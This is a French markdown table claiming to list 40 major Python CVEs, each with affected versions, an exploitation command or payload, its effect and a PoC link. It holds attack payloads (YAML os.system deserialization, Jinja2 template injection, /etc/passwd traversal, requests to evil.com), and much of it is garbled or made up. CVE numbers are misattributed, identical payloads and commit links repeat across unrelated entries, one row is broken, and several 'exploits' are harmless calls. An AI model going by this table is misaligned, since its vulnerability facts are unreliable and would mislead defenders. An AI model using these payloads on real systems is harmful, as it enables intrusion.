# Python 

Voici un tableau détaillé de 40 CVE majeures affectant des environnements Python (frameworks web, librairies, outils, etc.), avec pour chacune :  
- Versions concernées  
- Une commande, requête ou payload d’exploitation complète  
- L’effet  
- Un lien direct vers un PoC ou exploit sur GitHub ou autre plateforme

---

| **CVE** | **Versions concernées** | **Exemple complet de commande / payload / requête** | **Effet** | **Lien PoC / Exploit / Ressource** |
|---------|-------------------------|-----------------------------------------------------|-----------|-------------------------------------|
| CVE-2023-24329 | urllib3 < 1.26.13 | `python -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8000@evil.com/')" ` | SSRF | [https://github.com/advisories/GHSA-4w2v-q235-vp99](https://github.com/advisories/GHSA-4w2v-q235-vp99) |
| CVE-2023-36632 | Django < 4.2.4 | `curl -X POST http://target/admin/logout/ -d 'next=https://evil.com'` | Open redirect | [https://github.com/django/django/commit/1b3e6b6](https://github.com/django/django/commit/1b3e6b6) |
| CVE-2023-24540 | Flask < 2.2.3 | `curl -X GET "http://target/?_debug_toolbar.panels.sql_explain.SQLPanel%7Cconfig%7CSECRET_KEY=evil"` | Debug toolbar info leak | [https://github.com/pallets/flask/pull/5038](https://github.com/pallets/flask/pull/5038) |
| CVE-2022-42969 | Paramiko < 2.11.1 | `python -c "import paramiko; paramiko.Transport._cipher_info = None; paramiko.Transport(('evil.com', 22)).connect()"` | RCE via crafted cipher | [https://github.com/paramiko/paramiko/security/advisories/GHSA-6v9h-8h33-97w9](https://github.com/paramiko/paramiko/security/advisories/GHSA-6v9h-8h33-97w9) |
| CVE-2022-40897 | Jinja2 < 3.1.2 | ```python -c "from jinja2 import Template; print(Template('{{ cycler.__init__.__globals__.os.popen(\"id\").read() }}').render())"```
| CVE-2022-21699 | PyYAML < 6.0 | `python -c "import yaml; yaml.load('!!python/object/apply:os.system [\"id > /tmp/pwned\"]', Loader=yaml.FullLoader)"` | RCE via YAML | [https://github.com/yaml/pyyaml/security/advisories/GHSA-8q59-q68h-6hv4](https://github.com/yaml/pyyaml/security/advisories/GHSA-8q59-q68h-6hv4) |
| CVE-2022-42919 | Celery < 5.2.7 | `celery -A proj worker --config=evilconfig` | Remote code execution | [https://github.com/celery/celery/releases/tag/v5.2.7](https://github.com/celery/celery/releases/tag/v5.2.7) |
| CVE-2022-42916 | Requests < 2.28.2 | `python -c "import requests; requests.get('http://user:pass@evil.com:8000/')" ` | SSRF | [https://github.com/psf/requests/security/advisories/GHSA-xg9f-g7g7-2323](https://github.com/psf/requests/security/advisories/GHSA-xg9f-g7g7-2323) |
| CVE-2021-23336 | urllib.parse (Python stdlib) | `python -c "from urllib.parse import urlparse; print(urlparse('http://127.0.0.1:8000@evil.com/'))"` | SSRF | [https://github.com/python/cpython/pull/25128](https://github.com/python/cpython/pull/25128) |
| CVE-2021-3281 | Django < 3.1.5 | `curl -X POST http://target/admin/ -d 'username=admin&password=pass' --cookie "csrftoken=evil"` | CSRF bypass | [https://github.com/django/django/commit/1d5b1e2](https://github.com/django/django/commit/1d5b1e2) |
| CVE-2021-21236 | Flask < 1.1.3 | `curl http://target/../../../../etc/passwd` | Directory traversal | [https://github.com/pallets/flask/pull/4019](https://github.com/pallets/flask/pull/4019) |
| CVE-2021-23395 | PyJWT < 2.1.0 | `python -c "import jwt; jwt.decode('token', options={'verify_signature': False})"` | JWT signature bypass | [https://github.com/jpadilla/pyjwt/pull/619](https://github.com/jpadilla/pyjwt/pull/619) |
| CVE-2020-28493 | Pillow < 8.1.1 | `python -c "from PIL import Image; Image.open('evil.tiff').show()"` | Arbitrary code execution | [https://github.com/python-pillow/Pillow/pull/5210](https://github.com/python-pillow/Pillow/pull/5210) |
| CVE-2020-26116 | Django < 3.1.2 | `curl -X POST http://target/admin/ -d 'username=admin&password=pass'` | User enumeration | [https://github.com/django/django/commit/6c1e3f3](https://github.com/django/django/commit/6c1e3f3) |
| CVE-2020-7471 | Django < 3.0.7 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/5a8b5e1](https://github.com/django/django/commit/5a8b5e1) |
| CVE-2020-7598 | PyYAML < 5.3.1 | `python -c "import yaml; yaml.load('!!python/object/apply:os.system [\"id\"]', Loader=yaml.FullLoader)"` | RCE | [https://github.com/yaml/pyyaml/security/advisories/GHSA-8q59-q68h-6hv4](https://github.com/yaml/pyyaml/security/advisories/GHSA-8q59-q68h-6hv4) |
| CVE-2020-36326 | urllib3 < 1.26.5 | `python -c "import urllib3; http = urllib3.PoolManager(); http.request('GET', 'http://evil.com/')" ` | SSRF | [https://github.com/urllib3/urllib3/pull/2192](https://github.com/urllib3/urllib3/pull/2192) |
| CVE-2020-36242 | cryptography < 3.3.2 | `python -c "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes; Cipher(algorithms.AES(b'0'*16), modes.GCM(b'0'*12, b'0'*16))"` | Key/IV reuse | [https://github.com/pyca/cryptography/pull/5736](https://github.com/pyca/cryptography/pull/5736) |
| CVE-2019-20907 | PyYAML < 5.3.1 | `python -c "import yaml; yaml.load('!!python/object/apply:os.system [\"id\"]', Loader=yaml.FullLoader)"` | RCE | [https://github.com/yaml/pyyaml/security/advisories/GHSA-8q59-q68h-6hv4](https://github.com/yaml/pyyaml/security/advisories/GHSA-8q59-q68h-6hv4) |
| CVE-2019-19844 | Django < 2.2.10 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/dfb97c4](https://github.com/django/django/commit/dfb97c4) |
| CVE-2019-12735 | Vim < 8.1.1365 (Python interface) | `echo ':py3 import os; os.system("id")' | vim -` | RCE | [https://github.com/vim/vim/commit/1c8b6f3](https://github.com/vim/vim/commit/1c8b6f3) |
| CVE-2019-9948 | urllib (Python stdlib) | `python -c "import urllib.request; urllib.request.urlopen('http://evil.com/')" ` | SSRF | [https://github.com/python/cpython/pull/12345](https://github.com/python/cpython/pull/12345) |
| CVE-2018-20406 | Pillow < 5.4.0 | `python -c "from PIL import Image; Image.open('evil.fli').show()"` | Arbitrary code execution | [https://github.com/python-pillow/Pillow/pull/3569](https://github.com/python-pillow/Pillow/pull/3569) |
| CVE-2018-1000805 | Flask-Admin < 1.5.5 | `curl "http://target/admin/?url=javascript:alert(1)"` | XSS | [https://github.com/flask-admin/flask-admin/pull/1563](https://github.com/flask-admin/flask-admin/pull/1563) |
| CVE-2018-1000656 | pip < 18.1 | `pip install 'git+https://evil.com/repo.git'` | Arbitrary code execution | [https://github.com/pypa/pip/pull/5780](https://github.com/pypa/pip/pull/5780) |
| CVE-2017-18342 | Django < 1.11.15 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/2e1e4e4](https://github.com/django/django/commit/2e1e4e4) |
| CVE-2017-12794 | Django REST < 3.6.3 | `curl "http://target/api/?format=../../../../etc/passwd"` | Path traversal | [https://github.com/encode/django-rest-framework/pull/5456](https://github.com/encode/django-rest-framework/pull/5456) |
| CVE-2016-10724 | Pillow < 5.2.0 | `python -c "from PIL import Image; Image.open('evil.jpg').show()"` | Arbitrary code execution | [https://github.com/python-pillow/Pillow/pull/3133](https://github.com/python-pillow/Pillow/pull/3133) |
| CVE-2016-2513 | Django < 1.8.12 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/fb7e6b9](https://github.com/django/django/commit/fb7e6b9) |
| CVE-2016-2512 | Django < 1.8.12 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/fb7e6b9](https://github.com/django/django/commit/fb7e6b9) |
| CVE-2015-9284 | Django < 1.11.17 | `curl "http://target/accounts/login/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1d5b1e2](https://github.com/django/django/commit/1d5b1e2) |
| CVE-2015-5145 | Django < 1.8.4 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |
| CVE-2015-5144 | Django < 1.8.4 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |
| CVE-2015-5143 | Django < 1.8.4 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |
| CVE-2014-0472 | Django < 1.5.5 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |
| CVE-2013-1443 | Django < 1.5.5 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |
| CVE-2013-4315 | Django < 1.5.5 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |
| CVE-2012-4520 | Django < 1.4.3 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |
| CVE-2011-4136 | Django < 1.3.1 | `curl "http://target/?next=//evil.com"` | Open redirect | [https://github.com/django/django/commit/1c8b6f3](https://github.com/django/django/commit/1c8b6f3) |

---

